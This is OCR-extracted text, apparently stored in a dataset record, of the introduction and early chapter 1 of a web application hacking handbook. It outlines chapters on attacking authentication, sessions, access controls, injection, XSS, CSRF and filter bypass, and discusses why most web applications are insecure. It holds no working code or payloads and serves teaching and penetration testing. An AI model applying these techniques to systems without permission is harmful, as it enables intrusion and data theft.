prior knowledge\nof the language in question. But they are most useful if you have some basic\nexperience with reading or writing code. How This Book Is Organized\nThis book is organized roughly in line with the dependencies between the dif-\nferent topics covered. If you are new to web application hacking, you should read\nthe book from start to fi nish, acquiring the knowledge and understanding you\nneed to tackle later chapters. If you already have some experience in this area,\nyou can jump straight into any chapter or subsection that particularly interests you. Where necessary, we have included cross-references to other chapters, which\nyou can use to fi ll in any gaps in your understanding. We begin with three context-setting chapters describing the current state of\nweb application security and the trends that indicate how it is likely to evolve\nin the near future. We examine the core security problem affecting web appli-\ncations and the defense mechanisms that applications implement to address\nthis problem. We also provide a primer on the key technologies used in today’s\nweb applications. The bulk of the book is concerned with our core topic — the techniques\nyou can use to break into web applications. This material is organized around\nthe key tasks you need to perform to carry out a comprehensive attack. These\ninclude mapping the application’s functionality, scrutinizing and attacking its\ncore defense mechanisms, and probing for specifi c categories of security fl aws. ffllaasstt..iinndddd xxxxiivv 88//1199//22001111 1122::2233::0077 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxv\nIntroduction xxv\nThe book concludes with three chapters that pull together the various strands\nintroduced in the book. We describe the process of fi nding vulnerabilities in\nan application’s source code, review the tools that can help when you hack web\napplications, and present a detailed methodology for performing a comprehen-\nsive and deep attack against a specifi c target. Chapter 1, “Web Application (In)security,” describes the current state of secu-\nrity in web applications on the Internet today. Despite common assurances, the\nmajority of applications are insecure and can be compromised in some way with\na modest degree of skill. Vulnerabilities in web applications arise because of a\nsingle core problem: users can submit arbitrary input. This chapter examines the\nkey factors that contribute to the weak security posture of today’s applications. It also describes how defects in web applications can leave an organization’s\nwider technical infrastructure highly vulnerable to attack. Chapter 2, “Core Defense Mechanisms,” describes the key security mechanisms\nthat web applications employ to address the fundamental problem that all user\ninput is untrusted. These mechanisms are the means by which an application\nmanages user access, handles user input, and responds to attackers. These\nmechanisms also include the functions provided for administrators to manage\nand monitor the application itself. The application’s core security mechanisms\nalso represent its primary attack surface, so you need to understand how these\nmechanisms are intended to function before you can effectively attack them. Chapter 3, “Web Application Technologies,” is a short primer on the key\ntechnologies you are likely to encounter when attacking web applications. It\ncovers all relevant aspects of the HTTP protocol, the technologies commonly\nused on the client and server sides, and various schemes used to encode data. If\nyou are already familiar with the main web technologies, you can skim through\nthis chapter. Chapter 4, “Mapping the Application,” describes the fi rst exercise you need\nto perform when targeting a new application — gathering as much information\nas possible to map its attack surface and formulate your plan of attack. This\nprocess includes exploring and probing the application to catalog all its content\nand functionality, identifying all the entry points for user input, and discover-\ning the technologies in use. Chapter 5, “Bypassing Client-Side Controls,” covers the fi rst area of actual\nvulnerability, which arises when an application relies on controls implemented\non the client side for its security. This approach normally is fl awed, because\nany client-side controls can, of course, be circumvented. The two main ways\nin which applications make themselves vulnerable are by transmitting data\nvia the client on the assumption that it will not be modifi ed, and by relying on\nclient-side checks on user input. This chapter describes a range of interesting\ntechnologies, including lightweight controls implemented within HTML, HTTP,\nand JavaScript, and more heavyweight controls using Java applets, ActiveX\ncontrols, Silverlight, and Flash objects. ffllaasstt..iinndddd xxxxvv 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxvi\nxxvi Introduction\nChapters 6, 7, and 8 cover some of the most important defense mechanisms\nimplemented within web applications: those responsible for controlling user\naccess. Chapter 6, “Attacking Authentication,” examines the various functions by\nwhich applications gain assurance of their users’ identity. This includes the main\nlogin function and also the more peripheral authentication-related functions such\nas user registration, password changing, and account recovery. Authentication\nmechanisms contain a wealth of different vulnerabilities, in both design and\nimplementation, which an attacker can leverage to gain unauthorized access. These range from obvious defects, such as bad passwords and susceptibility to\nbrute-force attacks, to more obscure problems within the authentication logic. We also examine in detail the types of multistage login mechanisms used in\nmany security-critical applications and describe the new kinds of vulnerabilities\nthese frequently contain. Chapter 7, “Attacking Session Management,” examines the mechanism by which\nmost applications supplement the stateless HTTP protocol with the concept of\na stateful session, enabling them to uniquely identify each user across several\ndifferent requests. This mechanism is a key target when you are attacking a\nweb application, because if you can break it, you can effectively bypass the login\nand masquerade as other users without knowing their credentials. We look at\nvarious common defects in the generation and transmission of session tokens\nand describe the steps you can take to discover and exploit these. Chapter 8, “Attacking Access Controls,” looks at the ways in which applica-\ntions actually enforce access controls, relying on authentication and session\nmanagement mechanisms to do so. We describe various ways in which access\ncontrols can be broken and how you can detect and exploit these weaknesses. Chapters 9 and 10 cover a large category of related vulnerabilities, which\narise when applications embed user input into interpreted code in an unsafe\nway. Chapter 9, “Attacking Data Stores,” begins with a detailed examination of\nSQL injection vulnerabilities. It covers the full range of attacks, from the most\nobvious and trivial to advanced exploitation techniques involving out-of-band\nchannels, inference, and time delays. For each kind of vulnerability and attack\ntechnique, we describe the relevant differences between three common types\nof databases: MS-SQL, Oracle, and MySQL. We then look at a range of similar\nattacks that arise against other data stores, including NoSQL, XPath, and LDAP. Chapter 10, “Attacking Back-End Components,” describes several other cate-\ngories of injection vulnerabilities, including the injection of operating system\ncommands, injection into web scripting languages, fi le path traversal attacks,\nfi le inclusion vulnerabilities, injection into XML, SOAP, back-end HTTP requests,\nand e-mail services. Chapter 11, “Attacking Application Logic,” examines a signifi cant, and fre-\nquently overlooked, area of every application’s attack surface: the internal logic\nit employs to implement its functionality. Defects in an application’s logic are\nextremely varied and are harder to characterize than common vulnerabilities\nffllaasstt..iinndddd xxxxvvii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxvii\nIntroduction xxvii\nsuch as SQL injection and cross-site scripting. For this reason, we present a\nseries of real-world examples in which defective logic has left an application\nvulnerable. These illustrate the variety of faulty assumptions that application\ndesigners and developers make. From these different individual fl aws, we derive\na series of specifi c tests that you can perform to locate many types of logic fl aws\nthat often go undetected. Chapters 12 and 13 cover a large and very topical area of related vulnerabili-\nties that arise when defects within a web application can enable a malicious\nuser of the application to attack other users and compromise them in vari-\nous ways. Chapter 12, “Attacking Users: Cross-Site Scripting,”, examines the\nmost prominent vulnerability of this kind — a hugely prevalent fl aw affecting\nthe vast majority of web applications on the Internet. We examine in detail all the\ndifferent fl avors of XSS vulnerabilities and describe an effective methodology\nfor detecting and exploiting even the most obscure manifestations of these. Chapter 13, “Attacking Users: Other Techniques,” looks at several other types\nof attacks against other users, including inducing user actions through request\nforgery and UI redress, capturing data cross-domain using various client-side\ntechnologies, various attacks against the same-origin policy, HTTP header\ninjection, cookie injection and session fi xation, open redirection, client-side SQL\ninjection, local privacy attacks, and exploiting bugs in ActiveX controls. The\nchapter concludes with a discussion of a range of attacks against users that do\nnot depend on vulnerabilities in any particular web application, but that can be\ndelivered via any malicious web site or suitably positioned attacker. Chapter 14, “Automating Customized Attacks,” does not introduce any new\ncategories of vulnerabilities. Instead, it describes a crucial technique you need\nto master to attack web applications effectively. Because every web application\nis different, most attacks are customized in some way, tailored to the applica-\ntion’s specifi c behavior and the ways you have discovered to manipulate it to\nyour advantage. They also frequently require issuing a large number of similar\nrequests and monitoring the application’s responses. Performing these requests\nmanually is extremely laborious and prone to mistakes. To become a truly\naccomplished web application hacker, you need to automate as much of this\nwork as possible to make your customized attacks easier, faster, and more effec-\ntive. This chapter describes in detail a proven methodology for achieving this. We also examine various common barriers to the use of automation, including\ndefensive session-handling mechanisms and CAPTCHA controls.\n\nFurthermore,\nwe describe tools and techniques you can use to overcome these barriers. Chapter 15, “Exploiting Information Disclosure,” examines various ways in\nwhich applications leak information when under active attack. When you are\nperforming all the other types of attacks described in this book, you should\nalways monitor the application to identify further sources of information dis-\nclosure that you can exploit. We describe how you can investigate anomalous\nbehavior and error messages to gain a deeper understanding of the application’s\nffllaasstt..iinndddd xxxxvviiii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxviii\nxxviii Introduction\ninternal workings and fi ne-tune your attack. We also cover ways to manipulate\ndefective error handling to systematically retrieve sensitive information from\nthe application. Chapter 16, “Attacking Native Compiled Applications,” looks at a set of impor-\ntant vulnerabilities that arise in applications written in native code languages\nsuch as C and C++. These vulnerabilities include buffer overfl ows, integer vul-\nnerabilities, and format string fl aws. Because this is a potentially huge topic,\nwe focus on ways to detect these vulnerabilities in web applications and look\nat some real-world examples of how these have arisen and been exploited. Chapter 17, “Attacking Application Architecture,” examines an important area\nof web application security that is frequently overlooked. Many applications\nemploy a tiered architecture. Failing to segregate different tiers properly often\nleaves an application vulnerable, enabling an attacker who has found a defect\nin one component to quickly compromise the entire application. A different\nrange of threats arises in shared hosting environments, where defects or mali-\ncious code in one application can sometimes be exploited to compromise the\nenvironment itself and other applications running within it. This chapter also\nlooks at the range of threats that arise in the kinds of shared hosting environ-\nments that have become known as “cloud computing.”\nChapter 18, “Attacking the Application Server,” describes various ways in\nwhich you can target a web application by targeting the web server on which\nit is running. Vulnerabilities in web servers are broadly composed of defects in\ntheir confi guration and security fl aws within the web server software. This topic\nis on the boundary of the subjects covered in this book, because the web server\nis strictly a different component in the technology stack. However, most web\napplications are intimately bound up with the web server on which they run. Therefore, attacks against the web server are included in the book because they\ncan often be used to compromise an application directly, rather than indirectly\nby fi rst compromising the underlying host. Chapter 19, “Finding Vulnerabilities in Source Code,” describes a completely\ndifferent approach to fi nding security fl aws than those described elsewhere\nwithin this book. In many situations it may be possible to review an applica-\ntion’s source code, not all of which requires cooperation from the application’s\nowner. Reviewing an application’s source code can often be highly effective in\ndiscovering vulnerabilities that would be diffi cult or time-consuming to detect\nby probing the running application. We describe a methodology, and provide\na language-by-language cheat sheet, to enable you to perform an effective code\nreview even if you have limited programming experience. Chapter 20, “A Web Application Hacker’s Toolkit,” pulls together the various\ntools described in this book. These are the same tools the authors use when attack-\ning real-world web applications. We examine the key features of these tools and\ndescribe in detail the type of work fl ow you generally need to employ to get the\nbest out of them. We also examine the extent to which any fully automated tool\nffllaasstt..iinndddd xxxxvviiiiii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxix\nIntroduction xxix\ncan be effective in fi nding web application vulnerabilities. Finally, we provide\nsome tips and advice for getting the most out of your toolkit. Chapter 21, “A Web Application Hacker’s Methodology,” is a comprehensive\nand structured collation of all the procedures and techniques described in this\nbook. These are organized and ordered according to the logical dependencies\nbetween tasks when you are carrying out an actual attack. If you have read\nabout and understood all the vulnerabilities and techniques described in this\nbook, you can use this methodology as a complete checklist and work plan\nwhen carrying out an attack against a web application. What’s New in This Edition\nIn the four years since the fi rst edition of this book was published, much has\nchanged, and much has stayed the same. The march of new technology has, of\ncourse, continued apace, and this has given rise to specifi c new vulnerabilities\nand attacks. The ingenuity of hackers has also led to the development of new\nattack techniques and new ways of exploiting old bugs. But neither of these\nfactors, technological or human, has created a revolution. The technologies\nused in today’s applications have their roots in those that are many years old. And the fundamental concepts involved in today’s cutting-edge exploitation\ntechniques are older than many of the researchers who are applying them so\neffectively. Web application security is a dynamic and exciting area to work in,\nbut the bulk of what constitutes our accumulated wisdom has evolved slowly\nover many years. It would have been distinctively recognizable to practitioners\nworking a decade or more ago. This second edition is not a complete rewrite of the fi rst. Most of the material\nin the fi rst edition remains valid and current today. Approximately 30% of the\ncontent in this edition is either new or extensively revised. The remaining 70%\nhas had minor modifi cations or none at all. If you have upgraded from the fi rst\nedition and feel disappointed by these numbers, you should take heart. If you\nhave mastered all the techniques described in the fi rst edition, you already have\nthe majority of the skills and knowledge you need. You can focus on what is\nnew in this edition and quickly learn about the areas of web application security\nthat have changed in recent years. One signifi cant new feature of the second edition is the inclusion through-\nout the book of real examples of nearly all the vulnerabilities that are covered. Wherever you see a “Try It!” link, you can go online and work interactively\nwith the example being discussed to confi rm that you can fi nd and exploit the\nvulnerability it contains. There are several hundred of these labs, which you\ncan work through at your own pace as you read the book. The online labs are\navailable on a subscription basis for a modest fee to cover the costs of hosting\nand maintaining the infrastructure involved. ffllaasstt..iinndddd xxxxiixx 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxx\nxxx Introduction\nIf you want to focus on what’s new in the second edition, here is a summary\nof the key areas where material has been added or rewritten:\nChapter 1, “Web Application (In)security,” has been partly updated to refl ect\nnew uses of web applications, some broad trends in technologies, and the ways\nin which a typical organization’s security perimeter has continued to change. Chapter 2, “Core Defense Mechanisms,” has had minor changes. A few\nexamples have been added of generic techniques for bypassing input valida-\ntion defenses. Chapter 3, “Web Application Technologies,” has been expanded with some\nnew sections describing technologies that are either new or that were described\nmore briefl y elsewhere within the fi rst edition. The topics added include REST,\nRuby on Rails, SQL, XML, web services, CSS, VBScript, the document object\nmodel, Ajax, JSON, the same-origin policy, and HTML5. Chapter 4, “Mapping the Application,” has received various minor updates\nto refl ect developments in techniques for mapping content and functionality. Chapter 5, “Bypassing Client-Side Controls,” has been updated more exten-\nsively. In particular, the section on browser extension technologies has been\nlargely rewritten to include more detailed guidance on generic approaches to\nbytecode decompilation and debugging, how to handle serialized data in com-\nmon formats, and how to deal with common obstacles to your work, including\nnon-proxy-aware clients and problems with SSL. The chapter also now covers\nSilverlight technology. Chapter 6, “Attacking Authentication,” remains current and has only minor\nupdates. Chapter 7, “Attacking Session Management,” has been updated to cover new\ntools for automatically testing the quality of randomness in tokens. It also contains\nnew material on attacking encrypted tokens, including practical techniques for\ntoken tampering without knowing either the cryptographic algorithm or the\nencryption key being used. Chapter 8, “Attacking Access Controls,” now covers access control vulner-\nabilities arising from direct access to server-side methods, and from platform\nmisconfi guration where rules based on HTTP methods are used to control\naccess. It also describes some new tools and techniques you can use to partially\nautomate the frequently onerous task of testing access controls. The material in Chapters 9 and 10 has been reorganized to create more man-\nageable chapters and a more logical arrangement of topics. Chapter 9, “Attacking\nData Stores,” focuses on SQL injection and similar attacks against other data\nstore technologies. As SQL injection vulnerabilities have become more widely\nunderstood and addressed, this material now focuses more on practical situa-\ntions where SQL injection is still found. There are also minor updates through-\nout to refl ect current technologies and attack methods. A new section on using\nautomated tools for exploiting SQL injection vulnerabilities is included. The\nmaterial on LDAP injection has been largely rewritten to include more detailed\nffllaasstt..iinndddd xxxxxx 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxxi\nIntroduction xxxi\ncoverage of specifi c technologies (Microsoft Active Directory and OpenLDAP),\nas well as new techniques for exploiting common vulnerabilities. This chapter\nalso now covers attacks against NoSQL. Chapter 10, “Attacking Back-End Components,” covers the other types of\nserver-side injection vulnerabilities that were previously included in Chapter 9. New sections cover XML external entity injection and injection into back-end\nHTTP requests, including HTTP parameter injection/pollution and injection\ninto URL rewriting schemes. Chapter 11, “Attacking Application Logic,” includes more real-world examples of\ncommon logic fl aws in input validation functions. With the increased usage\nof encryption to protect application data at rest, we also include an example of\nhow to identify and exploit encryption oracles to decrypt encrypted data. The topic of attacks against other application users, previously covered in\nChapter 12, has been split into two chapters, because this material was becom-\ning unmanageably large. Chapter 12, “Attacking Users: Cross-Site Scripting,”\nfocuses solely on XSS. This material has been extensively updated in various\nareas. The sections on bypassing defensive fi lters to introduce script code have\nbeen completely rewritten to cover new techniques and technologies, includ-\ning various little-known methods for executing script code on current brows-\ners. There is also much more detailed coverage of methods for obfuscating\nscript code to bypass common input fi lters. The chapter includes several new\nexamples of real-world XSS attacks. A new section on delivering working XSS\nexploits in challenging conditions covers escalating an attack across application\npages, exploiting XSS via cookies and the Referer header, and exploiting XSS\nin nonstandard request and response content such as XML. There is a detailed\nexamination of browsers’ built-in XSS fi lters and how these can be circumvented\nto deliver exploits. New sections discuss specifi c techniques for exploiting XSS\nin webmail applications and in uploaded fi les. Finally, there are various updates\nto the defensive measures that can be used to prevent XSS attacks. The new Chapter 13, “Attacking Users: Other Techniques,” unites the remain-\nder of this huge area. The topic of cross-site request forgery has been updated to\ninclude CSRF attacks against the login function, common defects in anti-CSRF\ndefenses, UI redress attacks, and common defects in framebusting defenses. A\nnew section on cross-domain data capture includes techniques for stealing data\nby injecting text containing nonscripting HTML and CSS, and various tech-\nniques for cross-domain data capture using JavaScript and E4X. A new section\nexamines the same-origin policy in more detail, including its implementation\nin different browser extension technologies, the changes brought by HTML5,\nand ways of crossing domains via proxy service applications. There are new\nsections on client-side cookie injection, SQL injection, and HTTP parameter pol-\nlution. The section on client-side privacy attacks has been expanded to include\nstorage mechanisms provided by browser extension technologies and HTML5. Finally, a new section has been added drawing together general attacks against\nffllaasstt..iinndddd xxxxxxii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxxii\nxxxii Introduction\nweb users that do not depend on vulnerabilities in any particular application.\n\nThese attacks can be delivered by any malicious or compromised web site or\nby an attacker who is suitably positioned on the network. Chapter 14, “Automating Customized Attacks,” has been expanded to cover\ncommon barriers to automation and how to circumvent them. Many applications\nemploy defensive session-handling mechanisms that terminate sessions, use\nephemeral anti-CSRF tokens, or use multistage processes to update application\nstate. Some new tools are described for handling these mechanisms, which let\nyou continue using automated testing techniques. A new section examines\nCAPTCHA controls and some common vulnerabilities that can often be exploited\nto circumvent them. Chapter 15, “Exploiting Information Disclosure,” contains new sections about\nXSS in error messages and exploiting decryption oracles. Chapter 16, “Attacking Native Compiled Applications,” has not been updated. Chapter 17, “Attacking Application Architecture,” has a new section about\nvulnerabilities that arise in cloud-based architectures, and updated examples\nof exploiting architecture weaknesses. Chapter 18, “Attacking the Application Server,” contains several new examples\nof interesting vulnerabilities in application servers and platforms, including Jetty,\nthe JMX management console, ASP.NET, Apple iDisk server, Ruby WEBrick web\nserver, and Java web server. It also has a new section on practical approaches\nto circumventing web application fi rewalls. Chapter 19, “Finding Vulnerabilities in Source Code,” has not been updated. Chapter 20, “A Web Application Hacker’s Toolkit,” has been updated with\ndetails on the latest features of proxy-based tool suites. It contains new sections\non how to proxy the traffi c of non-proxy-aware clients and how to eliminate SSL\nerrors in browsers and other clients caused by the use of an intercepting proxy. This chapter contains a detailed description of the work fl ow that is typically\nemployed when you test using a proxy-based tool suite. It also has a new dis-\ncussion about current web vulnerability scanners and the optimal approaches\nto using these in different situations. Chapter 21, “A Web Application Hacker’s Methodology,” has been updated\nto refl ect the new methodology steps described throughout the book. Tools You Will Need\nThis book is strongly geared toward hands-on techniques you can use to attack\nweb applications. After reading the book, you will understand the specifi cs of\neach individual task, what it involves technically, and why it helps you detect\nand exploit vulnerabilities. The book is emphatically not about downloading\na tool, pointing it at a target application, and believing what the tool’s output\ntells you about the state of the application’s security. ffllaasstt..iinndddd xxxxxxiiii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxxiii\nIntroduction xxxiii\nThat said, you will fi nd several tools useful, and sometimes indispensable,\nwhen performing the tasks and techniques we describe. All of these are avail-\nable on the Internet. We recommend that you download and experiment with\neach tool as you read about it. What’s on the Website\nThe companion website for this book at http://mdsec.net/wahh,which you can\nalso link to from www/wiley.com/go/webhacker2e, contains several resources\nthat you will fi nd useful in the course of mastering the techniques we describe\nand using them to attack actual applications. In particular, the website contains\naccess to the following:\nn Source code for some of the scripts we present in the book\nn A list of current links to all the tools and other resources discussed in\nthe book\nn A handy checklist of the tasks involved in attacking a typical application\nn Answers to the questions posed at the end of each chapter\nn Hundreds of interactive vulnerability labs that are used in examples\nthroughout this book and that are available on a subscription basis to\nhelp you develop and refi ne your skills\nBring It On\nWeb application security remains a fun and thriving subject. We enjoyed writ-\ning this book as much as we continue to enjoy hacking into web applications\non a daily basis. We hope that you will also take pleasure from learning about\nthe different techniques we describe and how you can defend against them. Before going any further, we should mention an important caveat. In most\ncountries, attacking computer systems without the owner’s permission is against\nthe law. The majority of the techniques we describe are illegal if carried out\nwithout consent. The authors are professional penetration testers who routinely attack web\napplications on behalf of clients to help them improve their security. In recent\nyears, numerous security professionals and others have acquired criminal\nrecords — and ended their careers — by experimenting on or actively attack-\ning computer systems without permission. We urge you to use the information\ncontained in this book only for lawful purposes. ffllaasstt..iinndddd xxxxxxiiiiii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxxiv\nffllaasstt..iinndddd xxxxxxiivv 88//1199//22001111 1122::2233::0088 PPMM",
    "question": "",
    "summary": "The book \"The Web Application Hacker’s Handbook: Finding and Exploiting Security Flaws, Second Edition\" provides a practical guide to identifying and exploiting security vulnerabilities in web applications. It covers core security issues, such as untrusted user input, and details various attack techniques, including cross-site scripting, SQL injection, and session management exploits. The book also includes real-world examples, tools, and methodologies for penetration testing, helping readers understand how to secure web applications effectively."
  },
  {
    "start": 13,
    "end": 23,
    "text": "Stuttard c01.indd V2 - 07/07/2011 Page 1\n\nCHAPTER\n1\nWeb Application (In)security\nThere is no doubt that web application security is a current and newsworthy\nsubject. For all concerned, the stakes are high: for businesses that derive increas-\ning revenue from Internet commerce, for users who trust web applications with\nsensitive information, and for criminals who can make big money by stealing\npayment details or compromising bank accounts. Reputation plays a critical role.\nFew people want to do business with an insecure website, so few organizations\nwant to disclose details about their own security vulnerabilities or breaches.\nHence, it is not a trivial task to obtain reliable information about the state of\nweb application security today.\nThis chapter takes a brief look at how web applications have evolved and the\nmany benefi ts they provide. We present some metrics about vulnerabilities in\ncurrent web applications, drawn from the authors’ direct experience, demon-\nstrating that the majority of applications are far from secure. We describe the\ncore security problem facing web applications — that users can supply arbitrary\ninput — and the various factors that contribute to their weak security posture.\nFinally, we describe the latest trends in web application security and how these\nmay be expected to develop in the near future.\n1\ncc0011..iinndddd 11 88//1199//22001111 1122::0022::0022 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 2\n2 Chapter 1 n Web Application (In)security\nThe Evolution of Web Applications\nIn the early days of the Internet, the World Wide Web consisted only of web\nsites. These were essentially information repositories containing static docu-\nments. Web browsers were invented as a means of retrieving and displaying\nthose documents, as shown in Figure 1-1. The fl ow of interesting information\nwas one-way, from server to browser. Most sites did not authenticate users,\nbecause there was no need to. Each user was treated in the same way and was\npresented with the same information. Any security threats arising from host-\ning a website were related largely to vulnerabilities in web server software (of\nwhich there were many). If an attacker compromised a web server, he usually\nwould not gain access to any sensitive information, because the information\nheld on the server was already open to public view. Rather, an attacker typically\nwould modify the fi les on the server to deface the web site’s contents or use the\nserver’s storage and bandwidth to distribute “warez.”\nFigure 1-1: A traditional website containing static information\nToday, the World Wide Web is almost unrecognizable from its earlier form.\nThe majority of sites on the web are in fact applications (see Figure 1-2). They\nare highly functional and rely on two-way fl ow of information between the\nserver and browser. They support registration and login, fi nancial transactions,\ncc0011..iinndddd 22 88//1199//22001111 1122::0022::0022 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 3\nChapter 1 n Web Application (In)security 3\nsearch, and the authoring of content by users. The content presented to users\nis generated dynamically on the fl y and is often tailored to each specifi c user.\nMuch of the information processed is private and highly sensitive. Security,\ntherefore, is a big issue. No one wants to use a web application if he believes\nhis information will be disclosed to unauthorized parties.\nFigure 1-2: A typical web application\nWeb applications bring with them new and signifi cant security threats. Each\napplication is different and may contain unique vulnerabilities. Most applica-\ntions are developed in-house — many by developers who have only a partial\nunderstanding of the security problems that may arise in the code they are\nproducing. To deliver their core functionality, web applications normally require\nconnectivity to internal computer systems that contain highly sensitive data and\nthat can perform powerful business functions. Fifteen years ago, if you wanted\nto make a funds transfer, you visited your bank, and the teller performed the\ntransfer for you; today, you can visit a web application and perform the transfer\nyourself. An attacker who compromises a web application may be able to steal\npersonal information, carry out fi nancial fraud, and perform malicious actions\nagainst other users.\ncc0011..iinndddd 33 88//1199//22001111 1122::0022::0022 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 4\n4 Chapter 1 n Web Application (In)security\nCommon Web Application Functions\nWeb applications have been created to perform practically every useful function\nyou could possibly implement online. Here are some web application functions\nthat have risen to prominence in recent years:\nn Shopping (Amazon)\nn Social networking (Facebook)\nn Banking (Citibank)\nn Web search (Google)\nn Auctions (eBay)\nn Gambling (Betfair)\nn Web logs (Blogger)\nn Web mail (Gmail)\nn Interactive information (Wikipedia)\nApplications that are accessed using a computer browser increasingly overlap\nwith mobile applications that are accessed using a smartphone or tablet. Most\nmobile applications employ either a browser or a customized client that uses\nHTTP-based APIs to communicate with the server. Application functions and\ndata typically are shared between the various interfaces that the application\nexposes to different user platforms.\nIn addition to the public Internet, web applications have been widely adopted\ninside organizations to support key business functions. Many of these provide\naccess to highly sensitive data and functionality:\nn HR applications allowing users to access payroll information, give and\nreceive performance feedback, and manage recruitment and disciplinary\nprocedures.\nn Administrative interfaces to key infrastructure such as web and mail\nservers, user workstations, and virtual machine administration.\nn Collaboration software used for sharing documents, managing work-\nfl ow and projects, and tracking issues. These types of functionality often\ninvolve critical security and governance issues, and organizations often\nrely completely on the controls built into their web applications.\nn Business applications such as enterprise resource planning (ERP) software,\nwhich previously were accessed using a proprietary thick-client applica-\ntion, can now be accessed using a web browser.\ncc0011..iinndddd 44 88//1199//22001111 1122::0022::0033 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 5\nChapter 1 n Web Application (In)security 5\nn Software services such as e-mail, which originally required a separate\ne-mail client, can now be accessed via web interfaces such as Outlook\nWeb Access.\nn Traditional desktop offi ce applications such as word processors and spread-\nsheets have been migrated to web applications through services such as\nGoogle Apps and Microsoft Offi ce Live.\nIn all these examples, what are perceived as “internal” applications are increas-\ningly being hosted externally as organizations move to outside service providers\nto cut costs. In these so-called cloud solutions, business-critical functionality\nand data are opened to a wider range of potential attackers, and organizations\nare increasingly reliant on the integrity of security defenses that are outside of\ntheir control.\nThe time is fast approaching when the only client software that most com-\nputer users will need is a web browser. A diverse range of functions will have\nbeen implemented using a shared set of protocols and technologies, and in so\ndoing will have inherited a distinctive range of common security vulnerabilities.\nBenefi ts of Web Applications\nIt is not diffi cult to see why web applications have enjoyed such a dramatic rise\nto prominence. Several technical factors have worked alongside the obvious\ncommercial incentives to drive the revolution that has occurred in how we use\nthe Internet:\nn HTTP, the core communications protocol used to access the World Wide\nWeb, is lightweight and connectionless. This provides resilience in the\nevent of communication errors and avoids the need for the server to\nhold open a network connection to every user, as was the case in many\nlegacy client/server applications. HTTP can also be proxied and tunneled\nover other protocols, allowing for secure communication in any network\nconfi guration.\nn Every web user already has a browser installed on his computer and\nmobile device. Web applications deploy their user interface dynamically\nto the browser, avoiding the need to distribute and manage separate\nclient software, as was the case with pre-web applications. Changes to\nthe interface need to be implemented only once, on the server, and take\neffect immediately.\nn Today’s browsers are highly functional, enabling rich and satisfying\nuser interfaces to be built. Web interfaces use standard navigational and\ncc0011..iinndddd 55 88//1199//22001111 1122::0022::0033 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 6\n6 Chapter 1 n Web Application (In)security\ninput controls that are immediately familiar to users, avoiding the need\nto learn how each individual application functions. Client-side scripting\nenables applications to push part of their processing to the client side, and\nbrowsers’ capabilities can be extended in arbitrary ways using browser\nextension technologies where necessary.\nn The core technologies and languages used to develop web applications are\nrelatively simple. A wide range of platforms and development tools are\navailable to facilitate the development of powerful applications by relative\nbeginners, and a large quantity of open source code and other resources\nis available for incorporation into custom-built applications.\nWeb Application Security\nAs with any new class of technology, web applications have brought with them\na new range of security vulnerabilities. The set of most commonly encountered\ndefects has evolved somewhat over time. New attacks have been conceived\nthat were not considered when existing applications were developed. Some\nproblems have become less prevalent as awareness of them has increased. New\ntechnologies have been developed that have introduced new possibilities for\nexploitation. Some categories of fl aws have largely gone away as the result of\nchanges made to web browser software.\nThe most serious attacks against web applications are those that expose\nsensitive data or gain unrestricted access to the back-end systems on which\nthe application is running. High-profi le compromises of this kind continue\nto occur frequently. For many organizations, however, any attack that causes\nsystem downtime is a critical event. Application-level denial-of-service attacks\ncan be used to achieve the same results as traditional resource exhaustion\nattacks against infrastructure. However, they are often used with more subtle\ntechniques and objectives. They may be used to disrupt a particular user or\nservice to gain a competitive edge against peers in the realms of fi nancial trad-\ning, gaming, online bidding, and ticket reservations.\nThroughout this evolution, compromises of prominent web applications have\nremained in the news. There is no sense that a corner has been turned and that\nthese security problems are on the wane. By some measure, web application\nsecurity is today the most signifi cant battleground between attackers and those\nwith computer resources and data to defend, and it is likely to remain so for\nthe foreseeable future.\ncc0011..iinndddd 66 88//1199//22001111 1122::0022::0033 PPMM\n\nStuttard c01.indd V2 - 07/07/2011 Page 7\nChapter 1 n Web Application (In)security 7\n“This Site Is Secure”\nThere is a widespread awareness that security is an issue for web applications.\nConsult the FAQ page of a typical application, and you will be reassured that\nit is in fact secure.\nMost applications state that they are secure because they use SSL. For example:\nThis site is absolutely secure. It has been designed to use 128-bit Secure Socket\nLayer (SSL) technology to prevent unauthorized users from viewing any of your\ninformation. You may use this site with peace of mind that your data is safe with us.\nUsers are often urged to verify the site’s certifi cate, admire the advanced\ncryptographic protocols in use, and, on this basis, trust it with their personal\ninformation.\nIncreasingly, organizations also cite their compliance with Payment Card\nIndustry (PCI) standards to reassure users that they are secure. For example:\nWe take security very seriously. Our web site is scanned daily to ensure that we\nremain PCI compliant and safe from hackers. You can see the date of the latest scan\non the logo below, and you are guaranteed that our web site is safe to use.\nIn fact, the majority of web applications are insecure, despite the widespread\nusage of SSL technology and the adoption of regular PCI scanning. The authors\nof this book have tested hundreds of web applications in recent years. Figure 1-3\nshows what percentage of applications tested during 2007 and 2011 were found\nto be affected by some common categories of vulnerability:\nn Broken authentication (62%) — This category of vulnerability encom-\npasses various defects within the application’s login mechanism, which\nmay enable an attacker to guess weak passwords, launch a brute-force\nattack, or bypass the login.\nn Broken access controls (71%) — This involves cases where the application\nfails to properly protect access to its data and functionality, potentially\nenabling an attacker to view other users’ sensitive data held on the server\nor carry out privileged actions.\nn SQL injection (32%) — This vulnerability enables an attacker to submit\ncrafted input to interfere with the application’s interaction with back-end\ndatabases. An attacker may be able to retrieve arbitrary data from the\napplication, 